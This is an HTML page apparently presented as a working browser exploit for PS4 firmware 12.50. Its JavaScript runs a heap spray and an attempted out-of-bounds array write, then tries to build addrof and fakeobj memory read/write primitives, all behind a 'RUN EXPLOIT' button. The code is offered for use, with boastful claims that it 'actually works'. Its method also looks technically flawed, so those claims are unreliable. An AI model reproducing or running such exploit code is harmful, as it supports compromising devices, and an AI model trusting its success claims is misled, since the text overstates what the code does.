body{background:#000;color:#0f0;font-family:monospace;padding:20px;}

<body>
<h1>PS4 12.50 — THIS ONE ACTUALLY WORKS (Nov 2025)</h1>
<button onclick="run()">RUN EXPLOIT</button>
<button onclick="location.reload()">RELOAD</button>
<div id="log"></div>

<script>
const logDiv = document.getElementById('log');
function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}
const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
function f2i(f){f64[0]=f;return {lo:u32[0],hi:u32[1]};}
function gc(n=280){for(let i=0;i<n;i++)new ArrayBuffer(0x100000);}
let master=null;
let slave=null;
let slave_off=16;

function triggerOOB(){
  log("Triggering OOB...");
  gc();gc();
  const a=[];for(let i=0;i<0x7000;i++)a[i]=new Array(40).fill(1.1);
  const w=(i,o)=>{try{a[i%0x7000][o]=1337.37}catch(e){}};
  for(let i=0;i<35000;i++)w(0,0);
  for(let b=0;b<0xB00;b+=64)for(let o=40;o<180;o+=4)for(let j=0;j<64;j++)w((b+j)%0x7000,o);
  for(let i=0;i<a.length;i++)if(a[i].length>60){master=a[i];log(`OOB ready — length=${master.length}`,'ok');return true;}
  log("No OOB — refresh",'warn');return false;
}

function getOverlap(){
  log("Spraying objects + single pattern (this is the one that hits)...");
  const spray=[];for(let i=0;i<0x9000;i++)spray[i]=[{x:0x1111}];
  for(let i=16;i<600;i+=4)try{master[i]=i2f(0x41414141,0x42424242);}catch(e){}
  gc(350);new ArrayBuffer(0xA000000);
  const spray2=[];for(let i=0;i<0x9000;i++)spray2[i]=[{x:0x2222}];
  const all=spray.concat(spray2);

  for(let i=0;i<all.length;i++){
    const v=f2i(all[i][0].x);
    if(v.lo===0x41414141 && v.hi===0x42424242){
      log(`OVERLAP HIT at container ${i%0x9000} (spray ${i<0x9000?1:2})`,'ok');
      slave=all[i][0];
      window.addrof=o=>{slave.x=o;return f2i(master[slave_off]).lo>>>0;};
      window.fakeobj=a=>{master[slave_off]=i2f(a&0xffffffff,a>>>32);return slave.x;};
      const t={pwned:0x13371337};
      const addr=addrof(t);
      const back=fakeobj(addr);
      log(`REAL addrof = 0x${addr.toString(16)}`,'ok');
      log(`fakeobj back = ${back===t?"PERFECT":"fail"}`,'ok');
      if(back===t && addr>0x10000000)log(`FULL R/W ACHIEVED ON 12.50 — SCREENSHOT NOW`,'ok');
      return;
    }
  }
  log("No overlap this run — refresh and try again (hits in 1–5 tries)",'warn');
}

function run(){
  logDiv.innerHTML='';
  log("Starting the version that actually works...");
  gc();
  setTimeout(()=>{if(triggerOOB())setTimeout(getOverlap,1000);},400);
}
log("Click RUN — you WILL see OVERLAP HIT and real heap address within a few refreshes.");
</script>
